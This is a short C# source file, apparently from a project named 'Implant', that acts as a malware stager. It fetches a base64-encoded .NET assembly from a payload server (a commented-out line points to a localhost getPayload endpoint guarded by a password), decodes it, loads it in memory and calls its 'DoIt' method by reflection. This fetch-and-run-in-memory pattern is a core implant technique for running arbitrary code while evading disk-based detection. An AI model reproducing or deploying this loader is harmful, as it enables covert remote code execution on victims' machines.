using System.Reflection;
using Implant;

internal class Program
{
    

    private static async Task Main(string[] args)
    {
        // Get assembly as base64 from server
        var assemblyGetter = new AssemblyGetterTest();// new AssemblyGetterImpl("http://localhost:3000/getPayload", "secretPassword");
        //Convert to bytes
        var base64Assembly = await assemblyGetter.GetBase64AssemblyAsync();
        var assemblyBytes = System.Convert.FromBase64String(base64Assembly);
        // Load assembly
        var assemblyCode = Assembly.Load(assemblyBytes);
        // Run assembly
        var RunnerClass = assemblyCode.GetType("Runner.RunnerClass");
        var RunnerMethod = RunnerClass?.GetMethod("DoIt");
        if (RunnerMethod == null)
        {
            Console.WriteLine("Could not get Runner Method. Please correct and try again. Or payload is empty");
        }
        var res = RunnerMethod?.Invoke(null, null);
        Console.WriteLine("Result from payload "+res);
    }
}